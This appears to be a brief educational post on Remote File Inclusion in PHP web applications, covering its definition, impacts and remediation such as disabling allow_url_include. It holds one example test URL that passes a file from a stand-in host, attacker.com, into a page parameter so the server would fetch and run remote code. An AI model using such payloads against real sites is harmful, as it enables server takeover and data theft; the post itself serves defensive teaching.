RFI (Remote File Inclusion) is a web vulnerability where an attacker can include and execute a remote file (from an external server) on the vulnerable application,This happens when user input is used in file include functions without proper validation.

                                                                                   
                                                                                    Testing way Example


https://example.com/index.php?page=http://attacker.com/file.txt



                                                                                          Impact


If an RFI vulnerability exists, an attacker can:
🐚 Execute remote malicious code on the server
🔐 Gain full server compromise
📂 Read/modify/delete application files
🦠 Install malware or backdoors
🗄️ Steal database credentials and sensitive data
🔁 Pivot to internal systems




                                                                                         Remediation

❌ Never include files directly from user input
✅ Use allowlist-based file inclusion
🔍 Strictly validate and sanitize parameters
🚫 Disable dangerous settings: allow_url_include = Off
                                allow_url_fopen = Off
📁 Store include files outside web root
🛡️ Apply least-privilege file permissions
🔄 Keep server and application up to date
